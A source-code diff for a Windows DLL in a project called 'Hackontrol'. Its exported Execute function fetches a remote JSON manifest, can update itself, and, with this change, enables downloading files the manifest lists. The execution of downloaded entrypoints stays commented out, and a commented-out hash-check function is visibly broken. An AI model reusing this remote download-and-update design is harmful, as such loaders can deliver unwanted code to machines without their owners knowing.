@@ -4,13 +4,16 @@
 #include "execute.h"
 #include "resource.h"
 
+#include <openssl/sha.h>
+#include <openssl/md5.h>
+
 //#define HACKONTROL_OVERRIDE
 
 #ifndef HACKONTROL_OVERRIDE
 #ifdef _DEBUG
 #define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
 //#define HACKONTROL_NO_SELF_UPDATE
-#define HACKONTROL_NO_DOWNLOAD_FILE
+//#define HACKONTROL_NO_DOWNLOAD_FILE
 #define HACKONTROL_NO_EXECUTE_FILE
 #endif
 #endif
@@ -22,38 +25,7 @@ BOOL WINAPI DllMain(HINSTANCE application, DWORD reason, LPVOID reserved) {
 	return TRUE;
 }
 
-static void parseArgument(const LPCSTR argument, const PDWORD processIdentifier, const PBOOL update) {
-	if(!argument || !strlen(argument)) {
-		return;
-	}
-
-	LPWSTR buffer = KHOPANFormatMessage(L"%S", argument);
-
-	if(!buffer) {
-		return;
-	}
-
-	int count;
-	LPWSTR* arguments = CommandLineToArgvW(buffer, &count);
-	LocalFree(buffer);
-
-	if(!arguments) {
-		return;
-	}
-
-	if(count > 0) {
-		(*processIdentifier) = (DWORD) _wtoll(arguments[0]);
-	}
-
-	(*update) = count > 1 && _wtoll(arguments[1]) ? FALSE : TRUE;
-	LocalFree(arguments);
-}
-
 static BOOL selfUpdate(const cJSON* const root) {
-	if(!cJSON_IsObject(root)) {
-		return FALSE;
-	}
-
 	cJSON* self = cJSON_GetObjectItem(root, "self");
 
 	if(!self || !cJSON_IsObject(self)) {
@@ -166,14 +138,36 @@ static BOOL selfUpdate(const cJSON* const root) {
 	return TRUE;
 }
 
-BOOL HashFileCheck(const cJSON* const root, const LPCWSTR file) {
-	return FALSE;
-}
-
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	DWORD processIdentifier = 0;
 	BOOL update = TRUE;
-	parseArgument(argument, &processIdentifier, &update);
+	PBYTE buffer;
+
+	if(!argument || !strlen(argument)) {
+		goto initializeGlobal;
+	}
+
+	buffer = KHOPANFormatMessage(L"%S", argument);
+
+	if(!buffer) {
+		goto initializeGlobal;
+	}
+
+	int count;
+	LPWSTR* arguments = CommandLineToArgvW(buffer, &count);
+	LocalFree(buffer);
+
+	if(!arguments) {
+		goto initializeGlobal;
+	}
+
+	if(count > 0) {
+		processIdentifier = (DWORD) _wtoll(arguments[0]);
+	}
+
+	update = count > 1 && _wtoll(arguments[1]) ? FALSE : TRUE;
+	LocalFree(arguments);
+initializeGlobal:
 	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);
 
 	if(code != CURLE_OK) {
@@ -183,6 +177,9 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 
 	cJSON* root = NULL;
 	HANDLE handle;
+	LARGE_INTEGER integer;
+	DWORD read;
+	DATASTREAM stream = {0};
 #ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
 	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
@@ -191,23 +188,19 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		goto cleanupGlobal;
 	}
 
-	LARGE_INTEGER integer;
-
 	if(!GetFileSizeEx(handle, &integer)) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"GetFileSizeEx");
 		CloseHandle(handle);
 		goto cleanupGlobal;
 	}
 
-	PBYTE buffer = LocalAlloc(LMEM_FIXED, integer.LowPart + 1);
+	buffer = LocalAlloc(LMEM_FIXED, integer.LowPart + 1);
 
 	if(!buffer) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
 		CloseHandle(handle);
 		goto cleanupGlobal;
 	}
-
-	DWORD read;
 
 	if(!ReadFile(handle, buffer, integer.LowPart, &read, NULL)) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"ReadFile");
@@ -221,7 +214,6 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	LocalFree(buffer);
 	CloseHandle(handle);
 #else
-	DATASTREAM stream = {0};
 	code = HackontrolDownload(URL_LATEST_FILE, &stream, TRUE, TRUE);
 
 	if(code != CURLE_OK) {
@@ -241,8 +233,13 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		MessageBoxW(NULL, L"Unable to parse JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
 		goto cleanupGlobal;
 	}
+
+	if(!cJSON_IsObject(root)) {
+		KHOPANERRORMESSAGE_WIN32(ERROR_BAD_FORMAT, L"cJSON_IsObject");
+		goto deleteJson;
+	}
 #ifndef HACKONTROL_NO_SELF_UPDATE
-	if(selfUpdate(root)) {
+	if(update && selfUpdate(root)) {
 		goto deleteJson;
 	}
 #endif
@@ -250,12 +247,12 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		WaitForSingleObject(handle, INFINITE);
 		CloseHandle(handle);
 	}
-/*#ifndef HACKONTROL_NO_DOWNLOAD_FILE
-	if(!noUpdate) {
-		ProcessFilesArray(rootObject);
+#ifndef HACKONTROL_NO_DOWNLOAD_FILE
+	if(update) {
+		ExecuteDownload(root);
 	}
 #endif
-#ifndef HACKONTROL_NO_EXECUTE_FILE
+/*#ifndef HACKONTROL_NO_EXECUTE_FILE
 	ProcessEntrypointsArray(rootObject);
 #endif*/
 #ifndef HACKONTROL_NO_SELF_UPDATE
@@ -265,3 +262,47 @@ deleteJson:
 cleanupGlobal:
 	curl_global_cleanup();
 }
+
+/*BOOL HashFileCheck(const cJSON* const root, const LPCWSTR file) {
+	HANDLE file = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if(file == INVALID_HANDLE_VALUE) {
+		return FALSE;
+	}
+
+	LARGE_INTEGER fileSize;
+	BOOL match = FALSE;
+
+	if(!GetFileSizeEx(file, &fileSize)) {
+		goto closeHandle;
+	}
+
+	BYTE* buffer = LocalAlloc(LMEM_FIXED, fileSize.QuadPart);
+
+	if(!buffer) {
+		goto closeHandle;
+	}
+
+	DWORD bytesRead;
+
+	if(!ReadFile(file, buffer, fileSize.LowPart, &bytesRead, NULL)) {
+		goto freeBuffer;
+	}
+
+	if(fileSize.LowPart != bytesRead) {
+		goto freeBuffer;
+	}
+
+	HASH("sha512", SHA512, SHA512_DIGEST_LENGTH);
+	HASH("sha384", SHA384, SHA384_DIGEST_LENGTH);
+	HASH("sha256", SHA256, SHA256_DIGEST_LENGTH);
+	HASH("sha224", SHA224, SHA224_DIGEST_LENGTH);
+	HASH("sha1", SHA1, SHA_DIGEST_LENGTH);
+	HASH("md5", MD5, MD5_DIGEST_LENGTH);
+freeBuffer:
+	LocalFree(buffer);
+closeHandle:
+	CloseHandle(file);
+	return match;
+	return FALSE;
+}*/
